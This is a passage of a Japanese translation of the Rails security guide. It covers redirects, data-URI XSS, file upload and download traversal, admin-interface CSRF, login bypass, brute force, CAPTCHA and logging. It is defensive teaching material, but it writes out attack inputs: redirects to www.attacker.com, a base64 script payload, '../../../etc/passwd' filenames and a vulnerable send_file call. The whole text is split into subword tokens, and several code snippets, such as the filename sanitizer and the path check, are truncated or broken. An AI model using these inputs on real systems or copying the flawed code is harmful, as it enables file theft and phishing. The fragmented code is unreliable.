▁WARN ING : ▁ _ Web アプリケーション における リダイレクト は 、 ク ラ ッ キ ング ツール として 危 険 である にも か か わ らず 、 過 小 評価 され が ち です 。 攻撃者 は これ を使用して ユーザーを 危 険 な Web サイトに 送 り 込 んだ り 、 Web サイト 自体 に 罠 を 仕 掛 け たり することもできます 。
▁ リダイレクト 用の URL ▁( の一部 ) ▁ を ユーザーが 受け 入 れ てしまう と 、 潜 在 的な 脆弱性 となります 。
▁ 最も あ から さ ま な 攻撃 方法 として は 、 ユーザーを 本 物 そ っ く り の 偽 Web サイトに リダイレクト すること が 考え られます 。
▁これは 俗 に 「 フ ィ ッ シ ング ( ph i sh ing )」 や 「 釣 り 」 など と呼ばれる 攻撃 手法 です 。 具体的には 、 無 害 を 装 った リンク を含む メール を ユーザーに 送 り つ け 、 XSS を使用して その リンクを Web アプリケーションに 注 入 したり 、 リンクを 外部 サイトに 送信 したり します 。
▁この リンク は その Web アプリケーションの URL で 始 ま っている ので 、 一 見 無 害 に 見え ます 。 危 険 な サイトに 導 く URL は リダイレクト の パラメータ の中に 隠 されています ▁( http :// www . example . com / site / redirect ? to = ▁ www . a tt ack er . com )。
▁ここでは 古 い アクション を 例 示 します 。
▁def ▁ le g a c y
▁ redirect _ to ( params . update ( action : ' main ') )
▁このコードは 、 古 い アクション に対する アクセス があれば 、 ユーザーを メ イン の アクションに リダイレクト します 。
▁この コードの 本 来 の 意 図 は 、 従来 の アクション への URL パラメータ を 保 護 し 、 それ を メ イン の アクションに 渡す ことです 。
▁しかし 、 この URL に ホスト キー が含まれ ている と 、 攻撃者 に 悪 用 される 可能性があります 。
▁ http :// www . example . com / site / le g a c y ? param 1 = x y & param 2 = 23 & host = www . a tt ack er . com
▁ URL の 末尾 にある ホスト キー は 気 付 か れ に く く 、 ユーザー は a tt ack er . com ホスト に リダイレクト され てしまいます 。
▁ 単純な 対応策 として は 、 ▁ _ 古 い アクション では 期 待 に 添 う パラメータ だけ を含め るように する _ ▁という 方法 があります ▁( これは ホワイトリスト 的 ア プロ ー チ であり 、 期 待 に 添 わ ない パラメータ を 除 外 する方法 の 対 極 に あります )。
▁ _ URL を リダイレクト する 場合は 、 ホワイトリスト または 正規表現 と 照 合 するようにしてください 。 _
▁#### ▁ 自 己 完 結 型 XSS
▁ データ プロトコル を使用することで 、 Firefox と O per a に対して 別の タイプ の リ ダ イ レ ク ション と 自 己 完 結 型 XSS 攻撃 を 実行 できてしまいます 。
▁ データ プロトコル は 、 その 内容 を ブラウザ に 直接 表示 することができます 。 しか も 、 HTML 、 JavaScript や 画像 イ メ ー ジ ま る ご と など 、 何 でも 含 め ることができます 。
▁` data : text / html ; base 64 , P H N j c m l w d D 5 h b G V y d C g n W F N T J y k 8 L 3 N j c m l w d D 4 K `
▁この 例 では Base 64 で エンコード された JavaScript を使用しています 。 この JavaScript は 単 に メッセージ ボックス を表示します 。
▁ リ ダ イ レ ク ション URL 攻撃 では 、 攻撃者が このような 悪意のある コードを 含 んだ URL への リダイレクト を行います 。
▁この 攻撃 への 対応策 は 、 ▁ _ リダイレクト する URL ( あるいは そ の一部 ) を ユーザー が与えられ ないように すること _ ▁ です 。
▁### ▁ ファイル アップロード
▁NOT E : ▁ _ ファイルが アップロード された ときに 重要な ファイルが 上 書き される こと の ないように しましょう 。 また 、 メ デ ィ ア ファイルの 処理 は 非 同 期 で 行なう ように しましょう 。
▁ 多くの Web アプリケーション では 、 ユーザーが ファイルを アップロード できる ようになっています 。
▁ _ ユーザーが 選択 / 入力 できる ファイル名 ▁( または そ の一部 ) ▁ は 必ず フィルタ してください 。 _ ▁ 攻撃者が 危 険 な ファイル名 を わ ざ と 使用 して サーバー の ファイルを 上 書き し よう と する 可能性 がある ためです 。
▁ ファイルが ▁ / v ar / www / upload s ▁ ディレクトリ に アップロード され 、 その ときに ファイル名 が ▁" . . / . . / . . / e t c / pass w d " ▁ と 入力 されている と 、 重要な ファイルが 上 書き され てしまう 可能性があります 。
▁ 言 う まで も なく 、 Ruby イン タ プ リ タ に それ だけ の 実行 権限 が与えられ て い なければ 、 そのような 上 書き は 実行 できません 。 Web サーバー 、 データベース サーバー などの プログラム は 、 比 較 的 低 い 権限 を持つ Unix ユーザー として 実行 されている のが普通です 。
▁ そして もう 一 つ 注意 があります 。 ユーザーが 入力 した ファイル名 を フィルタ するときに 、 _ ファイル名 から 危 険 な 部分を 取り 除 こう など と しない ことです _ ▁ 。
▁Web アプリケーション が ファイル名 から ". . / " という 文字 を 取り 除 く ことができる として も 、 今度は 攻撃者が ▁" . ... / / " ▁ のような その 裏 を か く パターン を使用すれば 、 や は り ▁" . . / " ▁という 相 対 パス が 通 ってしまいます 。
▁ 最も 良い のは 「 ホワイトリスト 」 による ア プロ ー チ です 。 これは ▁ _ ファイル名 が 有効 である かどうか ▁( 指定された 文字 のみ が 使用されている かどうか ) ▁ をチェックする ものです _ .
▁これは 「 ブラックリスト 」 ア プロ ー チ と 逆 の 手法 です 。 こ ち ら は 、 使用 が 許 されて ない 文字 を 除 去 します 。
▁[ attachment _ f u ▁ p l ug in ]( https :// github . com / te ch now e en i e / attachment _ f u / tree / master ) の ファイル名 サ ニ タ イ ザ を以下に示します 。
▁def ▁ sanitize _ file name ( file name )
▁ file name . strip . t a p ▁do ▁| name |
▁# ▁ メ モ : ▁ File . base name は 、 Unix 上で の Windows パス に対して は 正常に動作し ません
▁# ▁ フル パス ではなく ファイル名 のみ を 取得
▁name . sub !
▁ / \ A . * ( \ \ | \ / ) / , ▁' '
▁# ▁ 最終的に 非 英 数 文字 を アンダースコア または
▁# ▁ ピ リ オ ド と アンダースコア に置き換え
▁name . g sub !
▁\ - ] / , ▁' _ '
▁( attachment _ f u ▁ プラグイン が 画像 に対して 行なう ように ) ▁ ファイルの アップロード を 同 期 的に 行なう と 、 セキュリティ 上 かなり 不 利 になります 。 ▁ _ サービス 拒 否 ▁( D o S ) ▁ 攻撃 の 脆弱性 _ ▁ が 生じる ためです 。
▁ 攻撃者 は 、 同 期 的に 行 わ れる 画像 ファイル アップロード を 多数の コンピュータ から 同時に 実行 することで 、 サーバー に 高 負 荷 を かけ て 最終的に サーバー を ク ラ ッ シ ュ または 動作 停 止 に 陥 ら せ ます 。
▁これ に対する 最 良 の 対応策 は 、 ▁ _ メ デ ィ ア ファイルを 非 同 期 的に 処理 すること _ ▁ です 。 メ デ ィ ア ファイル を保存し 、 その後 データベース 内 への 処理 の リクエストを ス ケ ジ ュ ー リ ング します 。
▁2 つ目の 処理 は 、 バ ッ ク グ ラ ウ ンド で 行います 。
▁### ▁ ファイル アップロード で 実行 可能な コードを 送 り 込 む
▁WARN ING : ▁ _ アップロード された ファイル に含まれる ソースコード が 特定の ディレクトリ に置かれている と 、 ソースコード が 実行 可能 になっ てしまう 可能性があります 。
▁Rails ' ▁ の / public ディレクトリ が A p a ch e の ホ ー ム ディレクトリ になっている 場合は 、 ここに アップロード ファイルを 置 いて は い け ません 。
▁ 広 く 使用されている A p a ch e ▁Web サーバー には ▁D o c um ent R oo t という オプション があります 。 ▁ web ▁ server ▁has ▁ an ▁ option ▁c all ed ▁D o c um ent R oo t .
▁これは Web サイトの ホ ー ム ディレクトリ であり 、 この ディレクトリ ツ リ ー に置かれている もの はすべて Web サーバー によって 取り 扱 わ れ ます 。
▁ そこ に置かれている ファイル の名前 に 特定の 拡張子 が与えられ ている と 、 それ に対して リクエスト が 送信された 時に 実行 され てしまう ことがあります ▁( 何らかの オプション を与える 必要がある かもしれません )。
▁ 実行される 可能性 のある 拡張子 は 、 たとえば P H P や C G I など です 。
▁ 攻撃者が ▁" file . c g i " ▁という ファイルを アップロード し 、 その 中に 危 険 な コードが 仕 込 まれ ている とします 。 この ファイルを 誰 か が ダウンロード すると 、 このコード が 実行されます 。
▁ _ A p a ch e の D o c um ent R oo t が Rails の / public ディレクトリ を 指 している 場合 、 アップロード ファイルを ここに 置 か ない で ください _ ▁ 。 少なくとも 1 階層 下 に する必要があります 。
▁### ▁ ファイルの ダウンロード
▁NOT E : ▁ _ ユーザーが どんな ファイル でも ダウンロード できる 状態 に しないでください
▁ ファイル アップロード 時に ファイル名 の フィルタ が 必要 だ った の と同様 、 ファイルの ダウンロード 時に も ファイル名 を フィルタ する必要があります 。
▁ s end _ file ( ) メソッドは 、 サーバー から クライアント に ファイルを 送信 します 。
▁ フィルタ 処理 されていない ファイル名 を使用すると 、 ユーザーが 任意の ファイルを ダウンロード できるように な ってしまいます 。
▁ s end _ file (' / v ar / www / upload s / ' ▁+ ▁ params [: file name ] )
▁" . . / . . / . . / e t c / pass w d " ▁ のような ファイル名 を 渡 せ ば 、 サーバー の ログイン 情報を ダウンロード できてしまいます 。
▁これ に対する シンプルな 対応策 は 、 ▁ _ リクエスト された ファイル名 が 、 期 待 されている ディレクトリ にある かどうか をチェックする _ ▁ ことです 。
▁ base name ▁= ▁ File . ex p and _ path ( File . join ( File . d ir name ( _ _ F I L E _ _ ) , ▁' . .
▁ file name ▁= ▁ File . ex p and _ path ( File . join ( base name , ▁@ file . public _ file name ) )
▁ raise ▁if ▁ base name ▁ !
▁ File . ex p and _ path ( File . join ( File . d ir name ( file name ) , ▁' . .
▁ s end _ file ▁ file name , ▁d is p o s i tion : ▁' in line '
▁ その他 に 、 ファイル名 を データベースに保存 しておき 、 サーバー の デ ィ ス ク 上 に置く 実際の ファイル名 には 代りに データベースの id を使用する という 方法 も 併 用 できます 。
▁この 方法 も 、 アップロード ファイルが 実行される 可能性 を 回 避 する方法 として 優 れ ています 。
▁ attachment _ f u プラグイン でも 同様 の 手法 が 採 用 されています 。
▁ イン ト ラ ネ ッ ト と Admin の セキュリティ
▁ ----------- ----------------
▁ イン ト ラ ネ ッ ト および 管理 画面 インターフェイス は 、 強 い 権限 が 許 されている ため 、 頻繁に 攻撃 の 目 標 に されます 。
▁ イン ト ラ ネ ッ ト および 管理 画面 インターフェイス には 、 他 よりも 手 厚 い セキュリティ 対策 が必要です が 、 現 実 には 逆 に む し ろ これらの 方が セキュリティ 対策 が 薄 い ということ が し ば し ば あります 。
▁20 07 年 、 その 名 も M on s ter . com という オンライン リ ク ルート 用 Web アプリケーションで 、 特 別 に 作 られ た ト ロ イ の 木馬 プログラム によって イン ト ラ ネ ッ ト から 情報 が 盗 み 出 され 、 文字 ど お り 経 営 者 にとって の モ ン ス ター と な った 事 件 があり ました 。
▁ ト ロ イ の 木馬 を わざわざ 特 別 に 誂 え る という のは これまで も 非常に まれ な こと であり 、 リ ス ク として は 相 当 低 い と 言 え ます が 、 それ でも ゼ ロ ではありません し 、 クライアント ホスト の セキュリティ も 重要 である という 好 例 で もあります 。
▁ただし 、 イン ト ラ ネ ッ ト や 管理 アプリケーション にとって 最も 脅 威 な のは XSS と CSRF です 。
▁** XSS : ** ▁ 悪意のある ユーザーが イン ト ラ ネ ッ ト の 外 から 入力 した データ が 再 表示される と 、 Web アプリケーション が XSS 攻撃 に対して 脆 弱 になります 。 ユーザー名 、 コメント 、 ス パ ム レポート 、 注文 フォームの 住 所 のような 情報 す ら XSS 攻撃 に 使用される ことがあります 。
▁ 管理 画面 や イン ト ラ ネ ッ ト で 1 箇所 でも サ ニ タ イ ズ 漏 れ があれば 、 アプリケーション 全体 が 脆 弱 になってしまい ます 。
▁ 想 定 される 攻撃 として は 、 管理者 の cookie の 盗 み 出 し 、 管理者 パスワードを 盗 み 出 す ための if r am e 注 入 、 管理者 権限 奪 取 のために ブラウザ の セキュリティ ホ ー ル を経由して 邪 悪 な ソフトウェア を インストール する 、 など が 考え られます 。
▁ XSS 対策 の 注 入 に関する 節 を参照してください 。
▁ _ S a f e E rb プラグイン _ ▁ を イン ト ラ ネ ッ ト や 管理 画面 でも 使用する ことを 強 く お勧め します 。
▁** CSRF : ** ▁ ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ▁( C r o s s - S it e ▁ Request ▁F org e ry ) ▁ は ク ロ ス サイト リ フ ァ レ ン ス フ ォ ー ジ ェ リ ▁( X S R F : ▁C r o s s - S it e ▁ Re f er en ce ▁F org e ry ) ▁ とも 呼ばれ 、 非常に 強力な 攻撃 手法 です 。 この 攻撃 を 受け ると 、 管理者 や イン ト ラ ネ ッ ト ユーザーが 行える ことを すべて 行える ように な ってしまいます 。
▁ CSRF については 既に 説明 しました ので 、 ここでは 攻撃者が イン ト ラ ネ ッ ト や 管理 画面 に対して 攻撃 を 仕 掛 け る 手順 を いくつかの 事 例 を 示 して 説明します 。
▁この 攻撃者 は 、 CSRF を 仕 込 んだ 危 険 な メール を メ キ シ コ の 多数の ユーザーに 送信 しました 。
▁この メール には 、「 お 客 様 のための e - カ ー ド が ご ざ います 」 と 書かれ ており 、 image タグ が含まれ ていました 。 そして その タグ には 、 ユーザーの ルーター を 再 構成 してしまう HTTP ▁GET リクエスト が 仕 込 まれ ていました 。 この ルーター は 、 メ キ シ コ で 広 く 普 及 している モデル です 。
▁この リクエスト によって D N S 設定 が変更され 、 メ キ シ コ で 事 業 を行って いる ネ ッ ト バ ン キ ング Web サイト が 、 攻撃者 の Web サイトに マ ッ プ され てしまい ました 。
▁この ルーター を経由して この ネ ッ ト バ ン キ ング サイト にアクセス すると 、 攻撃者が 設 置 した 偽 の Web サイト が 開 き 、 信 用 情報 が 盗 まれ てしまい ました 。
▁ Google ▁A d s en s e の メールアドレス と パスワード が変更され た 事 例 もあります 。
▁ 標 的 と な った ユーザーが Google ▁A d s en s e に ログイン し 、 Google 広 告 キ ャ ン ペ ー ン 用の 管理 画面 を開く と 、 攻撃者が 信 用 情報を 盗 み 出 す ことができ てしまい ました 。
▁ 他の 有 名 な 事 例 として は 、 危 険 な XSS を 拡 散 するために 一 般 の Web アプリケーション や ブログ 、 掲 示 板 が 利用 された 事 件 があります 。
▁ 言 う まで も なく 、 この 攻撃 を 成功 させる ためには 攻撃者が URL 構造 を 知 っている 必要があります が 、 Rails の URL は かなり 構造 が 素 直 である ため 、 オープン ソース の 管理 画面 を 使用している と 構造 を 容易に 推測 できてしまいます 。
▁ 攻撃者 は 、 あり そう な ID と パスワード の 組み合わせ を 総 当 り で 試 す 危 険 な I m age タグ を 送 り 込 む だけで 、 数 千 もの ま ぐ れ 当 たり を得る こともあります 。
▁ _ 管理 画面 や イン ト ラ ネ ッ ト への CSRF 攻撃 への 対策 については 、 CSRF の 対策 について の 節 を参照してください _ ▁ 。
▁### ▁その 他の 予 防 策
▁ 管理 画面 は 、 多くの 場合 次のような 作り になっている ものです 。 www . example . com / admin ▁ のような URL に置かれ 、 User モデルの admin フラグ が セット されている 場合 だけ ここ にアクセス でき 、 管理者 の 権限 で ユーザー 入力 が 再 表示される と 削除 / 追加 / 編集 な んで も できてしまいます
▁ここでは この こと について 考 察 してみましょう 。
▁ 管理 画面 に ▁ _ ロー ル ▁( r ol e ) _ ▁ を 導入 することで 、 攻撃者が 行える 操作 の 範囲 を 狭 め ることができます 。 1 人 の 管理者 に 全 権 を与える の ではなく 、 権限 を 複 数 管理者 で 分 散 する のです 。
▁ あるいは 、 管理 画面 用 に ▁ _ 特別な ログイン 情報 _ ▁ を 別 途 設 置 する という 方法 もあります 。 一 般 ユーザーが 登録 されている User モデルに 管理者 も 登録 し 、 管理者 フラグ で 分 け ると 攻撃 され やすい ので 、 これ を避ける ためです 。
▁ _ 極めて 重要な 操作 では 特殊な パスワードを 要求 する _ ▁ ように する という 方法 もあります 。
▁* ▁ 管理者 は 、 必ず し も その Web アプリケーション 全体 にアクセス できる 必要 は ない はずです 。
▁ _ 送信 元 I P アドレス を 一 定 の 範囲 に 制限 する _ ▁という 方法 を 考えてみましょう 。
▁ request . remote _ ip メソッドを使用して ユーザーの I P アドレス を チェック できます 。
▁この 方法は 攻撃 に対する 直接 の 防 弾 には なり ません が 、 検 問 として 非常に 有効 です 。
▁ プロキシ を使用して 送信 元 I P アドレス を 偽 る 方法 がある ことも 念 頭 に おいてください 。
▁* ▁ _ 管理 画面 を 特別な サブ ドメイン に置き _ ▁( admin . application . com など ) 、 さらに 独 立 した 管理 アプリケーションに して ユーザー 管理 を 独 自 に 行える ようにします 。
▁ このような 構成 に することで 、 通常の www . application . com ▁ ドメイン から の 管理者 cookie を 盗 み 出 す ことが 不 可能 になります 。
▁ ブラウザ には 同 一 生成 元 ポ リ シ ー が あるので 、 www . application . com ▁ に 注 入 された XSS スクリプト から は ▁ admin . application . com ▁ の cookie は 読み 出 せ ず 、 逆 について も同様に 読み出し 不 可 となります 。
▁ユーザー 管理
▁ ---------------
▁NOT E : ▁ _ 認 証 ▁( authentication ) ▁ と 認 可 ▁( author i z ation ) ▁ は ほぼ すべての Web アプリケーション において 不 可 欠 です 。
▁ 認証システム は 自 前 で 作る よりも 、 既存の プラグイン ▁( 訳 注 : ▁ 現在 なら gem ) ▁ を使用する ことをお勧めします 。
▁ただし 、 常に 最新の 状態 に アップ デ ート するようにしてください 。
▁この 他 に いくつかの 注意 を 守 ること で 、 アプリケーションを より セキュア に することができます 。
▁Rails では 多数の 認 証 用 プラグイン を 利用 できます 。
▁ 人 気 の 高 い [ de v is e ]( https :// github . com / p l at a format ec / de v is e ) ▁ や [ a u th log i c ]( https :// github . com / bin ary log i c / a u th log i c ) などの 優 れ た プラグイン は 、 パスワードを 平 文 ではなく 常に 暗号化 した 状態 で 保存 します 。
▁Rails ▁ 3.1 では 、 同様 の 機能 を持つ ビルトイン の ` has _ secure _ password ` メソッド を使用できます 。
▁ 新規ユーザー は 必ず メール 経由で ア ク テ ィ ベ ー ション コード を受け取り 、 メール 内の リンク 先 で アカウント を有効に する ようになっています 。
▁ アカウント が 有効 になる と 、 データベース 上の ア ク テ ィ ベ ー ション コードの カラム は NULL に 設定 されます 。
▁ 以下のような URL を リクエスト する ユーザー は 、 データベース で 見つか る 最初に 有効 になった ユーザー として Web サイトに ログイン でき てしまう ことがあります 。 そして それ が た また ま 管理者 である 可能性 もあります 。
▁ http :// localhost : 30 06 / user / activat e
▁ http :// localhost : 30 06 / user / activat e ? id =
▁ 一部の サーバー では 、 params [: id ] で 参 照 される パラメータ id が nil になって し ま っている ことが あるので 、 上の URL が 通 用 してしまう 可能性があります 。
▁ ア ク テ ィ ベ ー ション 操作 中に この ことが 突 き 止 め られ る まで の 流れ は 以下の とおりです 。
▁User . find _ by _ activation _ code ( params [: id ] )
▁ パラメータ が nil の場合 、 以下の SQL が 生成されます 。
▁` ` ` sql
▁ SELECT ▁* ▁FROM ▁ users ▁WHERE ▁( users . activation _ code ▁I S ▁ NULL ) ▁LIMIT ▁1
▁この 結果 、 最初の ユーザーが データベースに いる ことが わかり 、 結果 が 返 されて ログイン されます 。
▁ _ プラグイン は 、 機 会 を見 て アップ デ ート する ことをお勧めします _ ▁ 。
▁さらに 、 Web アプリケーションに このような 欠 陥 がない かどうか 見 直 し を かけ てください 。
▁### ▁ アカウント に対する 総 当 たり 攻撃
▁NOT E : ▁ _ アカウント に対する 総 当 たり 攻撃 ▁( B r u te - force ▁a tt ack ) ▁ とは 、 ログイン 情報 に対して 試 行 錯 誤 を 繰り返す 攻撃 です 。
▁ エラーメッセージ を より 一般的な もの に することで 回 避 可能です が 、 CAPTCHA ▁( 相手 が コンピュータ でない ことを確認 するための テスト ) ▁ への 情報 入力 の 義 務 付け も おそらく 必要 でしょう _ ▁ 。
▁Web アプリケーション 用の ユーザー名 リスト ▁( 名 簿 ) ▁ は 、 パスワード への 総 当 たり 攻撃 に 悪 用 される 可能性があります 。 ユーザー名 と同じ である などの 単 純 素 朴 な パスワードを 使っている 人 が 驚 く ほど 多 い ため 、 総 当 たり 攻撃 に 名 簿 が 利用 され やすい のです 。
▁ 辞 書 に 載 っている 言 葉 に 数字 を 混 ぜ た 程 度 の パスワード が 使用されている ことが よく あります 。
▁従って 、 名 簿 と 辞 書 を使用して 総 当 り 攻撃 を行なう 自動 化 プログラム があれば 、 もの の 数 分 で パスワード は 見 破 られ てしまいます 。
▁ このような 総 当 たり 攻撃 を 少し でも か わ す ため 、 多くの Web アプリケーション は わ ざ と 一般的な エラーメッセージ 「 ユーザー名 または パスワード が 違 います 」 を表示する ようにしています 。 どちら が 違 っている のか という 情報 を表示し ないこと で 、 総 当 たり 攻撃 による 推測 を 少し でも 遅 ら せ ます 。
▁ 「 入力 された ユーザー名 は 登録 されていません 」 など という メッセージ が 返 され よう もの なら 、 攻撃者 は すぐ さ ま ユーザー名 リスト を か き 集 め て 自動 で 巨 大 名 簿 を作成する でしょう 。
▁しかし 、 Web アプリケーションの デ ザ イ ナ ー が お ろ そ か に し が ち な のは 、 い わ ゆ る 「 パスワードを 忘れ た場合 」 ページ です 。
▁ こう した ページ では よく 、「 入力 された ユーザー名 または メールアドレス は 登録 されていません 」 という 情報 が表示されます 。
▁ こう した 情報 は 、 攻撃者が アカウント への 総 当 り 攻撃 に 使う 有効な ユーザー名 一覧 を作成する の に 使われ てしまいます 。
▁ これを 少し でも 緩 和 するには 、 ▁ _ 「 パスワードを 忘れ た場合 」 ページ でも 一般的な エラーメッセージ を表示する _ ▁ ように しましょう 。
▁さらに ▁ _ 特定の I P アドレス から の ログイン が 一 定 回 数 以上 失敗した場合 には 、 CAPTCHA ▁ の 入力 を ユーザーに 義 務 付け る _ ▁ ように してください 。
▁もちろん 、 この ぐらい では 自動 化 された 総 当 たり 攻撃 プログラム から の 攻撃 から 完全に 免 れる ことはできません 。 こう した プログラム は 送信 元 I P アドレス を 頻繁に 変更 する ぐらい の ことは や って の け る からです 。
▁しかし この 対策 は 攻撃 に対する ある程度 の バ リ ア になる ことも 確 か です 。
▁### ▁ アカウント の ハイジャック
▁ 多くの Web アプリケーション では 、 ユーザー アカウント の ハイジャック を 容易に 行 え てしまいます 。
▁ 攻撃 を 困 難 にする ような 改良 が 進 ま ない のは な ぜ でしょう か 。
▁#### ▁ パスワード
▁ 攻撃者が 、 盗 み 出 された ユーザー セッション cookie を 手 に 入 れ 、 それ によって Web アプリケーション が 標的ユーザー と の 間 で 共 用 可能 になった 状態 を 考えてみましょう 。
▁ パスワード が 簡単に 変更 できる 画面 設計 ( 古 い パスワード の 入力 が 不 要 ) であれば 、 攻撃者 は 数 クリック する だけで アカウント を ハイジャック できてしまいます 。
▁ あるいは 、 パスワード 変更 画面 が CSRF 攻撃 に対して 脆 弱 な 作り になっている 場合 、 攻撃者 は 標的ユーザー を 別の Web ページに 誘 い 込 み 、 CSRF を実行する ように 仕 込 まれ た im g タグ を 踏 ま せ て 、 標的ユーザー の Web パスワード を変更する でしょう 。
▁ 対応策 として は 、 _ パスワード 変更 フォーム が CSRF 攻撃 に対して 脆 弱 に なら ないように すること _ ▁ です 。
▁ 同時に 、 ▁ _ ユーザーに パスワード を変更 させる 場合は 、 古 い パスワードを 必ず 入力 させる ように してください 。 _
▁#### ▁ メール
▁しかし 攻撃者 は 、 登録 されている メールアドレス を変更する ことで アカウント を 乗 っ 取 ろ う と する 可能性 もあります ので 注意 が必要です 。
▁ 攻撃者 は メールアドレス 変更 に 成功 すると 、「 パスワードを 忘れ た場合 」 ページ に移動し 、 攻撃者 の 新しい メールアドレス に変更 通知 メールを送信 します 。 システム によって はこの メール に 新しい パスワード が 記 載 されている こともあります 。
▁ 対応策 は 、 ▁ _ メールアドレス を変更する 場合に も パスワード 入力 を 必 須 にする _ ▁ ことです 。
▁#### ▁ その他
▁Web アプリケーションの 構成 によって は 、 ユーザー アカウント を ハイジャック する方法 が 他にも 潜 んで いる 可能性があります 。
▁ 多くの 場合 、 CSRF と XSS が 原 因 となります 。
▁ここでは [ G Mail の CSRF 脆弱性 ]( http :// www . g n u c it ize n . org / blog / g oo g le - g mail - e - mail - h i j ack - te ch n i que / ) ▁ で 紹 介 されている 例 を と り あ げ ます 。
▁なお 上の 記事 に記載されている のは 概念 実 証 に 過 ぎ ません 。 仮 に この 攻撃 を 受け た場合 、 標的ユーザー は 攻撃者が 支 配 する Web サイトに 誘 い 込 まれ ます 。
▁その サイトの I m g タグ には 仕 掛 け があり 、 G Mail の フィルタ 設定 を変更する HTTP ▁GET リクエスト が そこ から 送信 されます 。
▁この 標的ユーザー が G Mail に ログイン して いた 場合 、 フィルタ 設定 が 攻撃者 によって 変更 され 、 この場合は すべての メール が 攻撃者 に 転 送 される ようになります 。
▁この 状態 は 、 アカウント 全体 が ハイジャック された の と同じ ぐらい に 有 害 です 。
▁ 対応策 は 、 ▁ _ アプリケーションの ロ ジ ッ ク を見 なお して XSS や CSRF 脆弱性 が 持 ち 込 まれ ないように すること _ ▁ と しか 言 い よう が ありません 。
▁### ▁ CAPTCHA
▁INFO : ▁ _ CAPTCHA とは 、 コンピュータ による 自動 応答 でない ことを確認 するための チ ャ レ ン ジ - レスポンス 式 テスト です 。
▁ コメント 入力 欄 など で 、 歪 んだ 画像 に 表示 されている 文字 を 入力 させる ことで 、 入力 社 が 自動 ス パ ム ボ ッ ト でない ことを確認する 場合に よく 使用されます 。
▁ ネ ガ テ ィ ブ CAPTCHA という 手法 を 使 えば 、 入力 者 に 自分 が 人 間 であることを 証 明 させる か わ り に 、 ボ ッ ト を 罠 には め て 正 体 を 暴 く ことができます 。
▁ い わ ゆ る ス パ ム ボ ッ ト 以外に 、 自動 ログイン ボ ッ ト も 問題 となります 。
▁ CAPTCHA の API として は [ re CAPTCHA ]( http :// re ca p t cha . net / ) が 有 名 です 。 これは 古 書 から 引 用 した 言 葉 を 歪 んだ 画像 として 表示 します 。
▁ 初期 の CAPTCHA では 背 景 を 歪 め て 反 り を与えて い ましたが 、 これは 突 破 された ため 、 現在 では 文字 の 上 に 曲 線 を 書き 加 え て 強 化 しています 。
▁なお 、 re CAPTCHA は 古 書 の デ ジ タ ル 化 にも 使 え ます 。
▁[ Re CAPTCHA ]( https :// github . com / am b e th i a / re ca p t cha / ) は Rails の プラグイン にも な っ ており 、 API として 同じ 名前 が 使用 されています 。
▁この API から は 公開 鍵 と 秘 密 鍵 の 2 つの 鍵 を受け取り ます 。 これらは Rails の 環境 に置く 必要があります 。
▁ それ により 、 ビューで re ca p t cha _ tag s メソッドを 、 コントローラ では ver if y _ re ca p t cha メソッドを それぞれ 使用できます 。
▁ 検証 に 失敗する と V er if y _ re ca p t cha から false が返されます 。
▁ い わ ゆ る CAPTCHA の 問題 は 、 ユーザー にとって 入力 が 多 少 なり とも 面倒 になる ことです 。
▁さらに 、 弱 視 など 視 力 に 問題 のある ユーザー は CAPTCHA の 歪 んだ 画像 を うまく 読 め ない こともあります 。
▁ここで 、 ネ ガ テ ィ ブ CAPTCHA という 別の アイディア があります 。 この 方法 の コ ン セ プ ト は 、 入力 者 を わ ず ら わ せ て 自分 が 人 間 であることを 証 明 させる 代りに 、 ボ ッ ト を 罠 には め て 入力 者 が ボ ッ ト であることを 突 き 止 め る という ものです 。
▁ たい て い の ボ ッ ト は 、 単 に Web ページを ク ロー ル して フォーム を見つけ る たびに ス パ ム 文 を入力する だけ の お 粗 末 な ものです 。
▁ ネ ガ テ ィ ブ CAPTCHA では 、 ボ ッ ト を は め る 罠 として 「 ハ ニ ー ポ ッ ト 」 フィールド を 用 意 します 。 これは 、 CSS や JavaScript を使用して 人 間 には 表示 され ないように した ダ ミ ー の フィールド です 。
▁ここでは 、 JavaScript や CSS を使用して ハ ニ ー ポ ッ ト フィールド を 人 間 から 隠 す 方法 を いくつか 説明します 。
▁* ▁ ハ ニ ー ポ ッ ト フィールド を 画面 の 外 に 追 い や って 見え ないように する
▁* ▁ フィールド を見 ない ぐらい に 小 さ く したり 、 背 景 と同じ 色 に したり する
▁* ▁ ハ ニ ー ポ ッ ト フィールド を 隠 さ ず 、 その 代 わ り 「 この フィールド には 何も 入力 しないでください 」 と 表示する
▁ 最も シンプルな ネ ガ テ ィ ブ CAPTCHA は 、 ハ ニ ー ポ ッ ト フィールド を 1 つ 使用する ものです 。
▁この フィールド を サーバー 側 で チェック します 。 フィールド に 何か 書き 込 まれ ていれば 、 入力 者 は ボ ッ ト である と 判 定 できます 。
▁ 後 は フォーム の内容 を 無視 する なり 、 通常 通 り メッセージ を表示する ( データベースに は 保存 しない ) など すれば よい のです 。
▁ 通常 ど お り メッセージ を 表示 しておけば 、 ボ ッ ト は 書き 込 み 失敗 に 気 が 付 か ずに そのまま 通 り す ぎ て い く でしょう 。
▁この 手法 は 、 迷 惑 な ユーザー への 対応策 として も 有効 です 。
▁ N ed ▁B at ch e l de r の [ ブログ 投 稿 ]( http :// n e db at ch e l de r . com / text / s to p b o t s . html ) には 、 さらに 洗 練 された ネ ガ テ ィ ブ CAPTCHA 手法 が いくつか 紹 介 されています 。
▁* ▁ 現在の UTC タイムスタンプ を含め た フィールド を フォーム に含め て お き 、 サーバー 側 で この フィールド を チェック します 。
▁ フィールド の 時刻 が 遠 い 過 去 になって いた り 未 来 になって いた り する 場合は 、 その フォーム は 無効 です 。
▁* ▁ フィールド 名を ランダム に変更 します
▁* ▁ ハ ニ ー ポ ッ ト フィールド を 複 数 用 意 し 、 送信 ボタン を含む あらゆる 型 を 与え ます 。
▁ ネ ガ テ ィ ブ CAPTCHA は 、 Web を ク ロー ル する 自動 ボ ッ ト から 保 護 すること しか できません 。 特定の サイトに 狙 い を 定 め て 作 られ た ボ ッ ト まで は 欺 け ません 。
▁従って 、 ▁ _ ネ ガ テ ィ ブ CAPTCHA は ログインフォーム の 保 護 には 必ず し も 向 か ない 可能性 もあります _ ▁ 。
▁### ▁ ログ 出力
▁WARN ING : ▁ _ Rails の ログ 出力 に パスワード が含まれ ること の ないように してください 。
▁ デフォルトで は 、 Rails の ログ には Web アプリケーション への リクエスト が すべて 出力 されます 。
